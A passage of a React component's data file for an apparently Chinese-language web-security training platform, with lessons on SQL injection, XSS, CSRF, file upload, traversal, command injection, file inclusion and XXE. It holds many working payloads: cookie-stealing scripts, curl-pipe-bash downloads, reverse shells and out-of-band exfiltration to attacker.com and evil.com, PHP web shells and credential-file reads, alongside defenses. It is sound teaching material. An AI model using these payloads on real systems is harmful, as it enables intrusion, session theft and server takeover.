import React, { useEffect, useState } from 'react';
import { useParams, Link } from 'react-router-dom';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { 
  faArrowLeft, 
  faBook, 
  faCode,
  faPlayCircle,
  faCheckCircle,
  faExclamationTriangle,
  faInfoCircle,
  faClock,
  faPaperPlane,
  faUpload,
  faDownload,
  faTerminal,
  faFile,
  faFileCode,
  faExchangeAlt,
  faServer,
  faPuzzlePiece,
  faLayerGroup,
  faGlobe,
  faHdd,
  faExternalLinkAlt,
  faCopy,
  faStopCircle,
  faPowerOff
} from '@fortawesome/free-solid-svg-icons';
import TerminalFeature from '../components/TerminalPanel';
import { 
  startTargetEnvironment, 
  stopTargetEnvironment, 
  getRunningTargetInfo,
  isTargetRunning
} from '../services/targetService';

// 知识库数据 - 实际应用中可从API获取
const knowledgeData = {
  'sql-injection': {
    title: 'SQL注入漏洞',
    icon: faCode,
    description: 'SQL注入是一种常见的网络安全漏洞，攻击者通过在输入字段中插入恶意SQL代码，来操纵数据库执行非预期的命令。',
    sections: [
      {
        title: '字符型SQL注入',
        content: '字符型SQL注入是指在字符串参数中进行注入，通常需要闭合引号。例如在 username=\'admin\' 的查询中，可以输入 admin\' OR \'1\'=\'1 来绕过登录验证。',
        examples: [
          "admin' OR '1'='1", 
          "admin' --",
          "admin' OR 1=1 #"
        ],
        difficulty: 'beginner'
      },
      {
        title: '数值型SQL注入',
        content: '数值型SQL注入是在数字参数中进行的注入，不需要引号闭合。例如在 id=1 的查询中，可以输入 1 OR 1=1 来返回所有记录。',
        examples: [
          "1 OR 1=1", 
          "1 AND 1=0 UNION SELECT 1,2,3,4",
          "1; SELECT * FROM users"
        ],
        difficulty: 'beginner'
      },
      {
        title: '联合注入',
        content: 'UNION注入利用SQL的UNION运算符合并两个SELECT语句的结果，用于从其他表获取数据。需要知道表的列数并确保类型匹配。',
        examples: [
          "1' UNION SELECT 1,2,3,4,5 --", 
          "1' UNION SELECT null,null,username,password,null FROM users --"
        ],
        difficulty: 'intermediate'
      },
      {
        title: '报错注入',
        content: '报错注入利用数据库的错误消息来提取信息。通过构造能触发错误但同时在错误消息中包含查询结果的SQL语句。',
        examples: [
          "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
          "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) --"
        ],
        difficulty: 'advanced'
      },
      {
        title: '布尔盲注',
        content: '布尔盲注在无法直接获取查询结果时使用，通过观察应用的真/假响应来推断信息。每次只能提取一位信息。',
        examples: [
          "1' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 0,1),1,1))>90 --",
          "1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 0,1)='a' --"
        ],
        difficulty: 'advanced'
      },
      {
        title: '时间盲注',
        content: '时间盲注是另一种盲注技术，使用数据库的时间延迟函数。如果条件为真，查询会延迟执行，攻击者通过响应时间来推断结果。',
        examples: [
          "1' AND IF(ASCII(SUBSTRING((SELECT username FROM users LIMIT 0,1),1,1))>90, SLEEP(5), 0) --",
          "1'; SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users; --"
        ],
        difficulty: 'expert'
      },
      {
        title: '二阶注入',
        content: '二阶注入是一种高级技术，攻击者首先将恶意输入存储在数据库中，然后在应用程序的另一个部分触发该输入被使用，造成注入。',
        examples: [
          "注册用户名: admin'-- 后登录并修改密码",
          "在个人资料中存储 '); DROP TABLE users; --"
        ],
        difficulty: 'expert'
      },
      {
        title: '绕过技术',
        content: '绕过技术用于规避应用程序的安全过滤。包括使用编码、注释、等效函数替换和空格替代等方法。',
        examples: [
          "空格替代: 1'/**/OR/**/1=1--",
          "大小写混合: UnIoN SeLeCt 1,2,3",
          "编码绕过: admin%27 OR 1=1",
          "注释嵌套: /*!50000 UNION*/ SELECT 1,2,3"
        ],
        difficulty: 'expert'
      }
    ],
    protection: [
      '使用参数化查询和预编译语句',
      '实施输入验证和过滤',
      '限制数据库用户权限',
      '使用WAF和入侵检测系统',
      '定期进行安全审计和渗透测试'
    ]
  },
  'xss': {
    title: '跨站脚本漏洞',
    icon: faCode,
    description: '跨站脚本(XSS)是一种注入攻击，攻击者在网页中注入恶意客户端代码。当用户浏览受影响的页面时，恶意脚本会执行，可能窃取信息或执行未授权操作。',
    sections: [
      {
        title: '反射型跨站脚本',
        content: '反射型XSS是最常见的类型，恶意代码从请求中"反射"到响应中。通常通过URL参数、表单提交或其他HTTP请求方式触发。',
        examples: [
          "<script>alert('XSS')</script>",
          "<img src=x onerror=alert('XSS')>",
          "<svg onload=alert('XSS')>"
        ],
        difficulty: 'beginner'
      },
      {
        title: '存储型跨站脚本',
        content: '存储型XSS是最危险的类型，恶意代码被永久存储在目标服务器上（如数据库）。当用户请求存储数据的页面时，恶意代码被执行。',
        examples: [
          "在评论框中: <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
          "在个人资料中: <img src=x onerror=fetch('https://evil.com?cookie='+btoa(document.cookie))>"
        ],
        difficulty: 'intermediate'
      },
      {
        title: 'DOM型跨站脚本',
        content: 'DOM型XSS不涉及服务器，而是攻击发生在客户端，恶意代码通过修改页面DOM环境触发。通常利用JavaScript动态操作DOM的页面。',
        examples: [
          "location.hash操作: https://example.com/page#<img src=x onerror=alert(1)>",
          "eval()执行: ?input=alert(1)"
        ],
        difficulty: 'advanced'
      },
      {
        title: '利用XSS平台获取Cookie',
        content: 'XSS攻击常用于窃取用户Cookie，攻击者可以利用这些Cookie劫持用户会话。专业的XSS平台可以自动化这一过程。',
        examples: [
          "<script>new Image().src='https://attacker.com/steal.php?cookie='+encodeURIComponent(document.cookie);</script>",
          "<script>fetch('https://evil.com/collect?data='+btoa(document.cookie))</script>"
        ],
        difficulty: 'intermediate'
      }
    ],
    protection: [
      '对输出进行HTML转义',
      '使用内容安全策略(CSP)',
      '实施输入验证',
      '使用HttpOnly和Secure标志保护Cookie',
      '使用现代框架的内置XSS保护'
    ]
  },
  'csrf': {
    title: '跨站请求伪造漏洞',
    icon: faPaperPlane,
    description: '跨站请求伪造(CSRF)是一种攻击，迫使用户在已认证的Web应用程序上执行非本意操作。攻击者诱导用户访问恶意网站，利用用户的身份向目标站点发起请求。',
    sections: [
      {
        title: 'GET型CSRF',
        content: 'GET型CSRF利用简单的GET请求进行攻击，这通常用于不需要太多数据的操作，如更改账户设置、关注用户等。利用图片标签或iframe可轻松触发。',
        examples: [
          "<img src='https://bank.example/transfer?to=attacker&amount=1000'>",
          "<iframe src='https://forum.example/delete-post?id=123' style='display:none'></iframe>"
        ],
        difficulty: 'beginner'
      },
      {
        title: 'POST型CSRF',
        content: 'POST型CSRF攻击更加复杂，因为需要构造一个表单并自动提交。这通常用于更敏感的操作，如密码更改、资金转账等。需要JavaScript自动提交表单。',
        examples: [
          "<form id='csrf-form' action='https://bank.example/transfer' method='POST'>\n  <input type='hidden' name='to' value='attacker'>\n  <input type='hidden' name='amount' value='1000'>\n</form>\n<script>document.getElementById('csrf-form').submit();</script>"
        ],
        difficulty: 'intermediate'
      },
      {
        title: 'CSRF漏洞POC改造',
        content: 'CSRF漏洞POC改造是指对已知的CSRF攻击进行修改和优化，使其更难被检测或适应特定目标网站的需求。这可能包括调整请求参数、添加延迟触发等。',
        examples: [
          "使用fetch API: fetch('https://target.com/api/update', {\n  method: 'POST',\n  credentials: 'include',\n  headers: { 'Content-Type': 'application/json' },\n  body: JSON.stringify({ newEmail: 'hacked@evil.com' })\n});",
          "XMLHttpRequest: var xhr = new XMLHttpRequest();\nxhr.open('POST', 'https://target.com/api/action', true);\nxhr.withCredentials = true;\nxhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\nxhr.send('param1=value1&param2=value2');"
        ],
        difficulty: 'advanced'
      },
      {
        title: 'CSRF绕过Referer检测',
        content: '许多网站使用HTTP Referer头来防止CSRF攻击，确保请求来自合法来源。绕过Referer检测的技术包括利用浏览器行为、使用meta标签或利用浏览器的Referer策略设置。',
        examples: [
          "<meta name=\"referrer\" content=\"no-referrer\">",
          "利用HTTPS到HTTP跳转: 某些浏览器在HTTPS到HTTP跳转时不发送Referer",
          "使用data: URI: <iframe src=\"data:text/html,<script>/*CSRF payload*/</script>\"></iframe>"
        ],
        difficulty: 'expert'
      }
    ],
    protection: [
      '使用CSRF令牌（一次性随机令牌）',
      '验证HTTP Referer头（作为辅助措施）',
      '使用SameSite Cookie属性',
      '要求用户重新验证敏感操作',
      '使用自定义请求头（如X-Requested-With）'
    ]
  },
  'file-upload': {
    title: '任意文件上传漏洞',
    icon: faUpload,
    description: '任意文件上传漏洞允许攻击者将恶意文件上传到服务器，这可能导致远程代码执行、服务器接管或网页篡改。攻击者通常会尝试绕过文件类型和内容限制。',
    sections: [
      {
        title: 'JavaScript校验绕过',
        content: 'JavaScript校验是最简单的文件上传限制，通常在客户端实现。由于客户端验证可以被轻易绕过（通过禁用JavaScript、修改前端代码或使用拦截代理），这种保护措施是不可靠的。',
        examples: [
          "使用浏览器开发工具移除验证脚本",
          "使用Burp Suite等代理拦截和修改请求",
          "修改HTML表单的accept属性: <input type=\"file\" accept=\".jpg,.png\" /> 改为接受所有文件"
        ],
        difficulty: 'beginner'
      },
      {
        title: 'MIME类型检测绕过',
        content: '许多应用程序通过检查Content-Type头来验证文件类型。攻击者可以将恶意文件的MIME类型修改为允许的类型（如image/jpeg），从而绕过这种保护。',
        examples: [
          "在Burp Suite中修改Content-Type: application/x-php 改为 image/jpeg",
          "使用双扩展名: shell.php.jpg (某些系统仅检查最后一个扩展名)",
          "在有效的图像文件中嵌入PHP代码（图像外壳）"
        ],
        difficulty: 'beginner'
      },
      {
        title: '扩展名校验绕过',
        content: '服务器端可能会检查文件扩展名以确保安全。攻击者可以尝试使用各种技术绕过这些检查，例如使用替代扩展名、大小写混合或特殊字符。',
        examples: [
          "使用不常见的扩展名: shell.phtml, shell.php5, shell.shtml",
          "使用大小写混合: shell.pHP, shell.Php",
          "使用空字节注入（在旧版本系统中）: shell.php%00.jpg"
        ],
        difficulty: 'intermediate'
      },
      {
        title: '文件内容检测绕过',
        content: '更高级的防护措施会检查文件内容（如魔术字节）以确认文件类型。攻击者可以通过在恶意文件开头添加有效的文件签名来欺骗这种检测。',
        examples: [
          "添加JPEG文件头: FF D8 FF E0 00 10 4A 46 49 46 00 01 [PHP代码]",
          "使用多部分文件（如GIF+PHP）: GIF89a<?php system($_GET['cmd']); ?>",
          "使用注释隐藏代码: <!--<?php system($_GET['cmd']); ?>-->"
        ],
        difficulty: 'advanced'
      },
      {
        title: '二次渲染绕过',
        content: '某些系统会对上传的图像进行处理或渲染，这可能会删除嵌入的恶意代码。但在特定情况下，攻击者可以构造在处理后仍保留恶意部分的文件。',
        examples: [
          "利用图像处理库的漏洞嵌入代码",
          "使用元数据字段（如EXIF）注入PHP代码",
          "构造处理后会产生有效恶意代码的复杂多层文件"
        ],
        difficulty: 'expert'
      },
      {
        title: '条件竞争绕过',
        content: '条件竞争攻击利用上传文件处理的时间差。某些系统可能先接受文件，执行初步验证，然后再进行深入检查或移动文件。攻击者可以在这个时间窗口内访问文件。',
        examples: [
          "上传恶意文件后立即发送多个请求尝试执行它",
          "利用文件处理时序，在验证完成前就访问临时上传位置",
          "自动化脚本持续请求潜在的临时文件路径"
        ],
        difficulty: 'expert'
      }
    ],
    protection: [
      '实施严格的服务器端文件类型验证',
      '使用白名单而非黑名单进行扩展名过滤',
      '验证文件内容而非仅依赖扩展名或MIME类型',
      '使用随机文件名存储上传文件，并记录原始名称在数据库中',
      '将上传的文件存储在无法直接访问的目录或外部存储服务中',
      '对上传的文件应用内容处理（如图像重采样）',
      '使用适当的文件权限（不可执行）'
    ]
  },
  'file-download': {
    title: '任意文件下载漏洞',
    icon: faDownload,
    description: '任意文件下载漏洞（也称为路径遍历或目录遍历）允许攻击者访问和下载服务器上的敏感文件，这些文件通常位于Web根目录之外。这可能导致源代码、配置文件或系统文件泄露。',
    sections: [
      {
        title: '路径遍历',
        content: '路径遍历（也称为目录遍历）是利用未经适当验证的文件路径参数，使攻击者能够访问预期目录之外的文件。通常使用"../"序列来向上导航目录结构。',
        examples: [
          "/?file=../../../etc/passwd",
          "/?document=../../../var/www/html/config.php",
          "/?log=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        ],
        difficulty: 'beginner'
      },
      {
        title: '未授权文件任意下载',
        content: '未授权文件下载发生在应用程序允许用户下载文件但没有适当的访问控制检查。攻击者可以通过修改请求参数来访问他们无权查看的文件，例如其他用户的私人文档。',
        examples: [
          "/?download=user_private_doc.pdf 改为 /?download=admin_financial_report.pdf",
          "修改用户ID参数: /files/download?user_id=123&file_id=456 改为 /files/download?user_id=999&file_id=789",
          "直接访问文件存储路径: /uploads/users/admin/secret.txt"
        ],
        difficulty: 'intermediate'
      },
      {
        title: '敏感文件获取',
        content: '敏感文件获取是指通过文件下载漏洞针对性地获取系统中的敏感信息，如配置文件、密钥、数据库凭据等。攻击者通常会根据目标系统的类型和架构寻找特定文件。',
        examples: [
          "常见配置文件: /etc/passwd, /etc/shadow, /proc/self/environ",
          "Web应用配置: /var/www/html/config.php, /app/config/database.yml",
          "源代码获取: /var/www/html/index.php, /app/controllers/UserController.php",
          "日志文件: /var/log/apache2/access.log, /var/log/nginx/error.log",
          "SSH密钥: /home/user/.ssh/id_rsa, /root/.ssh/authorized_keys"
        ],
        difficulty: 'advanced'
      },
      {
        title: '绕过路径限制',
        content: '当开发者尝试通过过滤或验证文件路径来防止攻击时，攻击者可能会使用各种技术来绕过这些限制，包括编码、过滤器绕过和攻击式的文件路径构造。',
        examples: [
          "使用URL编码: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
          "双重编码: %252e%252e%252f%252e%252e%252fetc%252fpasswd",
          "使用不同的路径分隔符: ..\\..\\etc\\passwd",
          "嵌套遍历序列: ....//....//etc/passwd",
          "空字节截断(旧版本): /../../../etc/passwd%00.png"
        ],
        difficulty: 'expert'
      }
    ],
    protection: [
      '避免将用户输入直接用于文件系统操作',
      '实现白名单而非黑名单的文件访问控制',
      '使用安全的文件访问APIs，如PHP的basename()函数',
      '规范化文件路径并验证它们在允许的目录内',
      '使用间接引用（如数据库ID而非文件路径）',
      '设置适当的文件系统权限',
      '使用Web服务器的沙盒机制（如chroot）'
    ]
  },
  'command-execution': {
    title: '命令/代码执行漏洞',
    icon: faTerminal,
    description: '命令执行漏洞允许攻击者在目标服务器上执行操作系统命令或代码，这可能导致完全控制系统、数据泄露或服务破坏。这类漏洞通常出现在将用户输入传递给系统命令的应用程序中。',
    sections: [
      {
        title: '命令注入基础',
        content: '命令注入发生在应用程序使用用户提供的输入作为系统命令的一部分，但没有适当过滤特殊字符时。攻击者可以通过插入命令分隔符（如;, |, &&, ||）来执行额外的系统命令。',
        examples: [
          "ping 127.0.0.1; ls -la",
          "ping 127.0.0.1 | cat /etc/passwd",
          "ping 127.0.0.1 && whoami",
          "ping 127.0.0.1 || rm -rf /important"
        ],
        difficulty: 'beginner'
      },
      {
        title: '绕过字符串过滤限制',
        content: '为防止命令注入，应用程序可能会过滤或转义特定字符。攻击者可以使用各种技术来绕过这些限制，包括替代命令、特殊字符和编码。',
        examples: [
          "使用反引号代替管道: ping `cat /etc/passwd`",
          "使用$()替代反引号: ping $(cat /etc/passwd)",
          "使用连接符避开空格过滤: cat\\${IFS}/etc/passwd",
          "多级编码: $(echo '63 61 74 20 2f 65 74 63 2f 70 61 73 73 77 64' | xxd -p -r)"
        ],
        difficulty: 'intermediate'
      },
      {
        title: '无回显的命令执行',
        content: '在某些情况下，命令执行的结果不会直接显示在响应中。攻击者可以使用"盲注"技术，通过观察应用程序的行为或使用外部通信通道来确认命令是否执行以及获取输出。',
        examples: [
          "使用时间延迟: ping 127.0.0.1 && sleep 5",
          "使用DNS外带数据: ping `whoami`.attacker.com",
          "使用Web请求外带: curl -d \"data=$(whoami)\" https://attacker.com/collect",
          "创建文件: ping 127.0.0.1 && ls -la > /var/www/html/output.txt"
        ],
        difficulty: 'advanced'
      },
      {
        title: '利用命令/代码执行漏洞写木马',
        content: '一旦确认命令执行漏洞，攻击者可能会尝试上传和执行恶意程序（木马），以建立持久访问或获得更高权限。这通常涉及创建或下载可执行文件或脚本，并配置系统以运行它们。',
        examples: [
          "echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/backdoor.php",
          "curl https://evil.com/backdoor.sh | bash",
          "wget -O /tmp/backdoor https://evil.com/backdoor && chmod +x /tmp/backdoor && /tmp/backdoor",
          "echo 'nc -e /bin/sh attacker.com 4444' > /etc/cron.d/backdoor"
        ],
        difficulty: 'advanced'
      },
      {
        title: '反弹shell',
        content: '反弹shell是一种攻击技术，使目标服务器主动连接到攻击者的计算机，并提供命令shell。这对于绕过防火墙和网络隔离特别有用，因为连接是从内部发起的。',
        examples: [
          "Bash反弹shell: bash -i >& /dev/tcp/attacker.com/4444 0>&1",
          "Python反弹shell: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'",
          "Perl反弹shell: perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
          "PHP反弹shell: php -r '$sock=fsockopen(\"attacker.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ],
        difficulty: 'expert'
      }
    ],
    protection: [
      '避免直接使用用户输入执行系统命令',
      '使用参数化API代替字符串拼接',
      '实施严格的输入验证和白名单',
      '限制应用程序运行权限（最小权限原则）',
      '使用Web应用防火墙拦截恶意请求',
      '实施网络分段和出站流量限制',
      '定期审计和扫描代码中的潜在命令注入点'
    ]
  },
  'file-inclusion': {
    title: '文件包含漏洞',
    icon: faFile,
    description: '文件包含漏洞允许攻击者包含未经授权的文件作为网页的一部分，这可能导致敏感信息泄露、代码执行或完全服务器接管。这类漏洞分为本地文件包含(LFI)和远程文件包含(RFI)。',
    sections: [
      {
        title: '基础文件包含',
        content: '文件包含漏洞存在于动态包含文件的应用程序中，特别是当文件路径由用户输入控制时。攻击者可以修改此参数以包含任意文件，包括敏感系统文件或恶意代码。',
        examples: [
          "本地文件包含(LFI): ?page=../../../etc/passwd",
          "远程文件包含(RFI): ?page=http://evil.com/shell.php",
          "使用PHP封装器: ?page=php://filter/convert.base64-encode/resource=index.php",
          "引入日志文件: ?page=../../../var/log/apache2/access.log"
        ],
        difficulty: 'beginner'
      },
      {
        title: '敏感文件读取',
        content: '使用文件包含漏洞，攻击者可以读取服务器上的敏感文件，包括配置文件、源代码、密码文件和其他敏感信息，即使这些文件位于Web根目录之外。',
        examples: [
          "读取系统文件: ?page=../../../etc/shadow",
          "读取配置文件: ?page=../../../var/www/html/config.php",
          "读取数据库凭据: ?page=../../../wp-config.php",
          "读取SSH密钥: ?page=../../../home/user/.ssh/id_rsa"
        ],
        difficulty: 'beginner'
      },
      {
        title: '日志文件包含',
        content: '日志文件包含是一种高级技术，攻击者首先在服务器日志中注入恶意代码（如通过操作User-Agent头），然后通过文件包含漏洞包含该日志文件，触发恶意代码执行。',
        examples: [
          "1. 注入恶意代码到User-Agent: <?php system($_GET['cmd']); ?>",
          "2. 包含访问日志: ?page=../../../var/log/apache2/access.log",
          "3. 执行注入的代码: ?page=../../../var/log/apache2/access.log&cmd=whoami",
          "其他常见日志: /var/log/mail.log, /var/log/auth.log, /var/log/sshd.log"
        ],
        difficulty: 'advanced'
      },
      {
        title: 'SESSION文件包含',
        content: 'SESSION文件包含利用PHP会话文件存储机制。攻击者先将恶意代码存储在自己的会话变量中，然后通过文件包含漏洞包含该会话文件，触发代码执行。',
        examples: [
          "1. 在会话中存储恶意代码: <?php $_SESSION['data']='<?php system($_GET[\"cmd\"]); ?>'; ?>",
          "2. 包含会话文件: ?page=../../../var/lib/php/sessions/sess_[SESSION_ID]",
          "3. 执行注入的代码: ?page=../../../var/lib/php/sessions/sess_[SESSION_ID]&cmd=whoami",
          "常见会话文件位置: /tmp/sess_*, /var/lib/php/sessions/sess_*"
        ],
        difficulty: 'advanced'
      },
      {
        title: '伪协议实现文件读取和代码执行',
        content: '在PHP等语言中，可以使用特殊的伪协议封装器来利用文件包含漏洞执行更复杂的攻击，包括读取源代码、执行代码或绕过特定限制。',
        examples: [
          "读取源码: ?page=php://filter/convert.base64-encode/resource=index.php",
          "代码执行: ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2B&cmd=whoami",
          "使用ZIP封装器: ?page=zip://uploads/malicious.zip#shell.php",
          "使用expect封装器执行命令: ?page=expect://ls"
        ],
        difficulty: 'advanced'
      },
      {
        title: '任意目录遍历',
        content: '目录遍历允许攻击者访问预期目录之外的文件。在文件包含漏洞中，这通常用于访问系统文件或跨应用程序边界读取文件。',
        examples: [
          "基本目录遍历: ?page=../../../../etc/passwd",
          "使用路径规范化绕过过滤: ?page=....//....//....//....//etc/passwd",
          "使用不同路径分隔符: ?page=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
          "使用父目录超出根目录: ?page=/var/www/../../etc/passwd"
        ],
        difficulty: 'intermediate'
      },
      {
        title: '00截断绕过',
        content: '在某些版本的PHP和其他语言中，空字节(%00)可以用于截断字符串。攻击者可以利用这一点绕过文件扩展名检查或其他安全措施，特别是在文件包含场景中。',
        examples: [
          "截断文件扩展名: ?page=../../../etc/passwd%00.php",
          "截断附加路径: ?page=../../../etc/passwd%00/harmless/path",
          "URL编码空字节: ?page=../../../etc/passwd%2500.php",
          "注意：此漏洞在PHP 5.3.4及更高版本中已修复"
        ],
        difficulty: 'advanced'
      }
    ],
    protection: [
      '避免基于用户输入包含文件',
      '使用预定义的白名单文件映射',
      '禁用不必要的PHP封装器（如expect, data）',
      '启用open_basedir限制',
      '禁用远程文件包含（allow_url_include=Off）',
      '实施严格的输入验证和规范化',
      '使用Web应用防火墙拦截恶意请求',
      '遵循最小权限原则配置Web服务器'
    ]
  },
  'xxe': {
    title: 'XML外部实体注入漏洞',
    icon: faFileCode,
    description: 'XML外部实体注入(XXE)是一种针对处理XML输入的应用程序的攻击，通过利用XML解析器处理外部实体引用的特性，可能导致敏感数据泄露、服务器端请求伪造、服务器探测或拒绝服务。',
    sections: [
      {
        title: 'XXE基础知识',
        content: 'XML外部实体(XXE)攻击利用XML处理器解析用户提供的XML时对外部实体的处理。XML文档可以定义实体（变量），包括从外部源加载内容的外部实体。攻击者可以利用此功能访问系统文件、执行SSRF攻击或发起DoS攻击。',
        examples: [
          "基本XXE攻击:\n<!DOCTYPE test [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>",
          "使用DTD文件:\n<!DOCTYPE test SYSTEM \"http://evil.com/evil.dtd\">\n<root>Test</root>\n\n# evil.dtd内容:\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"
        ],
        difficulty: 'beginner'
      },
      {
        title: '有回显的XXE',
        content: '有回显的XXE是指攻击者能够在应用程序响应中直接看到所检索文件的内容。这是最直接的XXE攻击形式，因为攻击结果立即可见。',
        examples: [
          "读取系统文件:\n<!DOCTYPE test [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>",
          "读取源代码:\n<!DOCTYPE test [\n  <!ENTITY xxe SYSTEM \"file:///var/www/html/config.php\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>",
          "列出目录内容:\n<!DOCTYPE test [\n  <!ENTITY xxe SYSTEM \"file:///var/www/html/\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>"
        ],
        difficulty: 'intermediate'
      },
      {
        title: '无回显的XXE',
        content: '无回显的XXE发生在应用程序处理外部实体但不在响应中显示其内容时。攻击者需要使用替代技术来提取数据，如带外数据通道(OOB)或错误消息。',
        examples: [
          "使用带外通道(HTTP):\n<!DOCTYPE test [\n  <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n  <!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">\n  %dtd;\n]>\n<root>Test</root>\n\n# evil.dtd内容:\n<!ENTITY % all \"<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>\">\n%all;\n%send;",
          "使用带外通道(DNS):\n<!DOCTYPE test [\n  <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n  <!ENTITY % eval \"<!ENTITY exfil SYSTEM 'http://%file;.attacker.com/x'>\">\n  %eval;\n  %exfil;\n]>\n<root>Test</root>",
          "利用错误消息:\n<!DOCTYPE test [\n  <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n  <!ENTITY % eval \"<!ENTITY error SYSTEM 'file:///nonexistent/%file;'>\">\n  %eval;\n  %error;\n]>\n<root>Test</root>"
        ],
        difficulty: 'advanced'
      },
      {
        title: 'XXE进阶技术',
        content: '高级XXE技术用于绕过安全措施、提取二进制数据或执行更复杂的操作。这些技术通常涉及复杂的实体构造、参数实体和自定义错误处理。',
        examples: [
          "使用参数实体绕过过滤:\n<!DOCTYPE test [\n  <!ENTITY % param1 \"file:\">\n  <!ENTITY % param2 \"///etc/passwd\">\n  <!ENTITY % combined \"%param1;%param2;\">\n  <!ENTITY % file SYSTEM \"%combined;\">\n  <!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">\n  %dtd;\n]>\n<root>Test</root>",
          "使用PHP封装器进行Base64编码(用于二进制文件):\n<!DOCTYPE test [\n  <!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>",
          "XInclude技术(当无法控制完整XML文档时):\n<root xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n  <xi:include parse=\"text\" href=\"file:///etc/passwd\"/>\n</root>"
        ],
        difficulty: 'expert'
      },
      {
        title: 'XXE拒绝服务攻击',
        content: 'XXE可用于执行多种拒绝服务攻击，包括无限实体扩展(亿笑攻击)和外部资源枯竭。这些攻击可能导致服务器CPU或内存资源耗尽。',
        examples: [
          "亿笑攻击:\n<!DOCTYPE lolz [\n  <!ENTITY lol \"lol\">\n  <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n  <!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n  <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n  <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n  <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n  <!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\n  <!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">\n  <!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\n  <!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\n]>\n<lolz>&lol9;</lolz>",
          "外部实体耗尽:\n<!DOCTYPE test [\n  <!ENTITY xxe SYSTEM \"file:///dev/random\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>",
          "远程服务器耗尽:\n<!DOCTYPE test [\n  <!ENTITY xxe SYSTEM \"http://delayserver.com/delay.php?time=60\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>"
        ],
        difficulty: 'expert'
      }
    ],
    protection: [
      '在XML解析器中禁用外部实体和DTD处理',
      '使用安全配置的XML解析器，如JAXP DocumentBuilderFactory的setFeature方法',
      '对用户提供的XML内容进行输入验证和过滤',
      '使用简单数据格式如JSON替代XML（如可能）',
      '实施数据输入的白名单验证',
      '使用XSD验证输入的XML文档',
      '定期更新XML处理库到最新版本',
      '使用Web应用防火墙配置规则检测XXE攻击特征'
    ]
  },
  'logic-vulnerabilities': {
    title: '业务逻辑漏洞',
    icon: faExchangeAlt,
    description: '业务逻辑漏洞存在于应用程序流程和功能的实现中，这类漏洞不是由于技术缺陷，而是由于设计或实现过程中的逻辑错误。它们往往与特定应用程序的业务规则密切相关，因此很难通过自动化工具发现。',
    sections: [
      {
        title: '用户名遍历',
        content: '用户名遍历漏洞允许攻击者确认特定用户名是否存在于系统中。当应用程序对有效和无效用户名响应不同时，攻击者可以收集有效账户列表，为进一步攻击提供基础。',
        examples: [
          "错误信息差异: 提示\"用户名不存在\"与\"密码错误\"",
          "响应时间差异: 验证有效用户名比无效用户名需要更长时间",
          "恢复密码功能: \"该电子邮件未注册\"与\"已发送重置链接\"",
          "批量账户探测: 自动化脚本测试常见用户名列表"
        ],
        difficulty: 'beginner'
      },
      {
        title: '重放攻击',
        content: '重放攻击是指攻击者捕获和重复使用有效的用户请求或数据传输，以欺骗系统执行重复操作或跳过身份验证步骤。这种攻击通常涉及会话令牌、认证凭证或交易数据的重用。',
        examples: [
          "认证令牌重用: 捕获并重复使用过期的访问令牌",
